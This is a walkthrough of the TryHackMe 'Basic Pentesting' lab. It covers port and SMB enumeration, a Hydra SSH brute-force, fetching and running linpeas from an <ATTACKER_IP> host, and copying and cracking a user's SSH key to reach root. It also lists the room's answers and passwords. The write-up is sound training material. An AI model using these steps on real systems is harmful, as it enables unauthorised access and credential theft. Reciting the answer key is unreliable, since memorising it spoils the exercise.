[TryHackMe | Basic Pentesting](https://tryhackme.com/room/basicpentestingjt)

Video: https://youtu.be/xl2Xx5YOKcI
A log of penetration testing activities on various targets.

## Target 1: $IP

### 1. Reconnaissance

#### 1.1. Nmap Scan

An Nmap scan was performed to identify open ports and services on the target machine.

**Command:**
 
```bash
nmap -sS -sV -oN /home/kali/Desktop/Tryhackme/Basic_Pentesting/nmap_quick_scan.txt $IP
```

**Results:**
The scan found the following open ports:
- **22/tcp:** SSH (OpenSSH 8.2p1)
- **80/tcp:** HTTP (Apache httpd 2.4.41)
- **139/tcp:** netbios-ssn (Samba)
- **445/tcp:** netbios-ssn (Samba)
- **8009/tcp:** ajp13 (Apache Jserv)
- **8080/tcp:** http (Apache Tomcat 9.0.7)
The full scan output is saved in the file `nmap_quick_scan.txt`.

---

#### 1.2. SMB Enumeration

To diagnose issues with `enum4linux`, a manual check for anonymous SMB access was performed.

**Command:**
  
```bash
smbclient -L //$IP -N
```

**Results:**
- **Success!** The server allows anonymous (null session) logins.
- An interesting share named `Anonymous` was discovered.
This indicates the problem with `enum4linux` is not related to login, but to a subsequent enumeration step.

---

#### 1.3. enum4linux Scan

After diagnosing and addressing issues with `enum4linux` (including fixing a script bug and adjusting command flags), a successful enumeration was performed.

**Command:**

```bash
enum4linux -a $IP -o enum4linux_final_output.txt
```

**Results:**
- **OS Information:** Samba Server 4.15.13-Ubuntu, OS version 6.1.
- **Shares:** `Anonymous` (Disk), `IPC$` (IPC Service). The `Anonymous` share allows mapping and listing.
- **Password Policy:**
    - Minimum password length: 5
    - Password Complexity: Disabled
    - Other detailed password policy settings were retrieved (e.g., account lockout, password age).
- **Users and Groups:** No users or groups were retrieved via enumeration.
- **Printers:** No printers were found.

The full output is saved in `enum4linux_final_output.txt`.

---
## Target 2: $IP

### 2. Reconnaissance
#### 2.2. Examining Discovered Files

The contents of the discovered files were retrieved.

**Commands:**

```bash
curl http://$IP/development/j.txt
curl http://$IP/development/dev.txt
```

**Content of `j.txt`:**

```text
For J:
I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP.
-K
```

**Content of `dev.txt`:**

```text
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K
2018-04-22: SMB has been configured. -K
2018-04-21: I got Apache set up. Will put in our content later. -J
```

**Key Observations:**
- Communication between users `J` and `K`.
- `j.txt` indicates user `J` has a weak password.
- `dev.txt` mentions Apache Struts version `2.5.12` (known to be vulnerable).


---
#### 2.3. Directory Enumeration (feroxbuster)

A directory enumeration scan was performed on port 80.

**Command:**

```bash
feroxbuster -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o feroxbuster_port80_current_ip.txt
```

**Results:**

- `/development` (directory)
- `/development/j.txt` (file)
- `/development/dev.txt` (file)

The full output is saved in `feroxbuster_port80_current_ip.txt`.

---

#### 2.4. SMB Enumeration (enum4linux)

An `enum4linux` scan was performed to enumerate Samba information.

**Command:**

```bash
enum4linux -a $IP -o enum4linux_current_ip.txt
```

**Results:**
- **Workgroup/Domain:** `WORKGROUP`
 - **Allows Null Sessions:** Yes.
- **Shares:** `Anonymous` (Disk), `IPC$` (IPC Service).
- **Password Policy:** Minimum password length: 5, **Password Complexity: Disabled**.
- **Users Enumerated:** `kay` (K), `jan` (J), `ubuntu`, `nobody`.

The full output is saved in `enum4linux_current_ip.txt`.

---

### 3. Initial Access

#### 3.1. Brute-Force Attack (Hydra)

A brute-force attack was performed on the SSH service for user `jan`.

**Command:**

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

**Results:**

- **Credentials Found!**
- **Username:** `jan`
- **Password:** `armando`

---

#### 3.2. SSH Access

Successfully gained initial access to the system.

**Command:**

```bash
ssh jan@$IP
```

**Credentials:** `jan:armando`

---

### 4. Privilege Escalation

#### 4.1. Post-Exploitation Enumeration (linpeas)

After logging in as `jan`, a comprehensive enumeration was performed using `linpeas.sh`.

**Command:**

```bash
cd /tmp; wget http://<ATTACKER_IP>:8000/linpeas.sh -O linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh
```

**Note:** To enable the victim machine to download `linpeas.sh`, the attacker must run a Python HTTP server on their machine in the directory containing `linpeas.sh`.

**Attacker's Command:**

```bash
python3 -m http.server $Port
```

**Critical Findings:**

- **User `kay` Privileges:** User `kay` is in the `sudo` group.
- **`kay`'s Files:** Found `/home/kay/.ssh/id_rsa` (encrypted) and `/home/kay/pass.bak`.
- **Vulnerabilities:** System is likely vulnerable to `PwnKit (CVE-2021-4034)`, `DirtyPipe (CVE-2022-0847)`, and `sudo Baron Samedit (CVE-2021-3156)`.
- **System Information:** Ubuntu 20.04.6 LTS, Kernel 5.15.0-139-generic.

---

#### 4.2. File Transfers (scp)

Transferred `kay`'s files from the target machine to Kali.

**Commands:**

```bash
scp jan@$IP:/home/kay/.ssh/id_rsa ./kay_id_rsa

```

**Results:**

- '/home/kay/.ssh/id_rsa' files were successfully transferred.

---





**Commands:**

```bash
ssh2john kay_id_rsa > kay_id_rsa.hash
```

**Commands:**

```bash
sudo john --wordlist=/usr/shear/wordlists/rockyou.txt kay_id_rsa.hash

```

**Results:**

- We found the 'beeswax' is password for  'kay_id_rsa'
- now we can use this information for login in 'kay'

**Commands:**

```bash
ssh -i kay_id_rsa kay@IP
```
after login no we can used 
**Commands:**

```bash
ls -a
```

and 

**Commands:**

```bash
cat for pass.bak
```

**Commands:**

```bash
scp kay@$IP:/home/kay/pass.bak ./pass.bak

```


#### 4.3. Gaining `kay`'s Password

The content of `pass.bak` was retrieved.

**Password for `kay`:** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

---

#### 4.4. Escalating to `root`

Logged in as `kay` and used `sudo` to gain root access.

**Commands:**
**Results:**

- **Credentials Found!**
- **Username:** `kay`
- **Password:** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

```bash
ssh kay@$IP
sudo -i

```

---

# Summary of Penetration Test

*Note: In this summary, $IP refers to the current target IP address.*

This report summarizes the methodology, tools, and findings during the penetration testing of the target machine (`$IP`). The process covered initial reconnaissance, gaining initial access as `jan`, escalating privileges to `kay`, and finally achieving `root` access.

## Methodology & Findings:

### Phase 1: Initial Reconnaissance & Enumeration

*   **Tools Used:** Nmap, `curl`, `feroxbuster`.
*   **Process:**
    *   **Nmap Scan:** Identified open ports 22 (SSH), 80 (HTTP Apache), 139/445 (SMB Samba), 8009 (AJP13), 8080 (HTTP Tomcat).
    *   **Initial `curl` Check (Port 80):** Revealed an "Undergoing maintenance" page.
    *   **Feroxbuster Scan (Port 80):** Discovered `/development` directory, containing `j.txt` and `dev.txt`.
*   **Key Findings:** Multiple open services, hidden web paths, and critical information in text files.

### Phase 2: Information Gathering & Initial Access

*   **Tools Used:** `curl`, `enum4linux`, `hydra`.
*   **Process:**
    *   **Examining `j.txt` and `dev.txt`:**
        *   Revealed communication between users `J` and `K`.
        *   Indicated user `J` (jan) had a weak, easily crackable password, and `K` (kay) configured SMB.
        *   Mentioned Apache Struts version 2.5.12, a known vulnerable version.
    *   **SMB Enumeration (`enum4linux`):**
        *   Confirmed `WORKGROUP` and null sessions allowed.
        *   **Critical:** Password Complexity Disabled, Minimum password length 5.
        *   Enumerated local users: `kay`, `jan`, `ubuntu`, `nobody`.
        *   Identified `Anonymous` share.
    *   **Brute-Force Attack (SSH with `hydra`):**
        *   Targeted user `jan` on SSH (port 22) using `rockyou.txt` wordlist.
        *   **Success:** Found `jan`'s password: `armando`.
    *   **Initial Access:** Logged in via SSH as `jan`.

*   **Key Findings:** Usernames `jan` and `kay`, a weak password policy, and initial access to the system as `jan`.
### Phase 3: Privilege Escalation to `kay`

*   **Tools Used:** `linpeas.sh`, `scp`.
*   **Process:**
    *   **Post-Exploitation Enumeration (as `jan`):**
        *   Discovered `pass.bak` in `/home/kay` and `.ssh/id_rsa` (encrypted private key) in `/home/kay/.ssh`.
        *   Confirmed `jan` had no `sudo` privileges.
    *   **LinPEAS Scan:** Performed a comprehensive local enumeration.
        *   **Critical:** Identified `kay` as a member of the `sudo` group.
    *   **File Transfer:** Successfully transferred `kay_id_rsa` and `pass.bak` to Kali using `scp`.
    *   **Direct Password Retrieval:** Content of `pass.bak` was found to be `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`, revealing `kay`'s direct password.
*   **Key Findings:** `kay`'s password, and confirmation that `kay` has `sudo` privileges.
### Phase 4: Privilege Escalation to `root`

*   **Tools Used:** `ssh`, `sudo`.
*   **Process:**
    *   Logged in as `kay` via SSH using the newly found password.
    *   **Achieved `root` Access:** Executed `sudo -i`.
*   **Key Findings:** Full `root` access to the target system.

### Tools Summary:

*   **Nmap:** Port scanning and service version detection.
*   **Curl:** Web page retrieval, file examination.
*   **Feroxbuster:** Web directory enumeration.
*   **Enum4linux:** SMB enumeration (users, shares, password policy).
*   **Hydra:** Brute-force attacks (SSH).
*   **LinPEAS.sh:** Comprehensive local privilege escalation enumeration.
*   **SSH:** Secure shell access.
*   **SCP:** Secure file transfer.
*   **sudo:** Privilege escalation on Linux.

---

# Questions & Answers

**1. Deploy the machine and connect to our network**

  *   This is a general setup step, assumed to be completed before the actions in this report.

**2. Find the services exposed by the machine**

*   The following services were found across the different targets:
    *   SSH (port 22)
    *   HTTP (ports 80, 8080, 8008)
    *   NetBIOS/Samba (ports 139, 445)
    *   AJP13 (port 8009)

**3. What is the name of the hidden directory on the web server (enter name without /)?**

*   `development`

**4. User brute-forcing to find the username & password**

  *   This step was performed using Hydra against the SSH service.

**5. What is the username?**

*   `jan`

**6. What is the password?**

*   `armando`

**7. What service do you use to access the server (answer in abbreviation in all caps)?**

*   `SSH`

**8. Enumerate the machine to find any vectors for privilege escalation**

*   This step was performed using `linpeas.sh`, which revealed that the user `kay` was in the `sudo` group.

**9. What is the name of the other user you found (all lower case)?**

*   `kay`

**10. If you have found another user, what can you do with this information?**

*   It was discovered that `kay` is a member of the `sudo` group, which allows for privilege escalation to `root`.

**11. What is the final password you obtain?**

*   `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`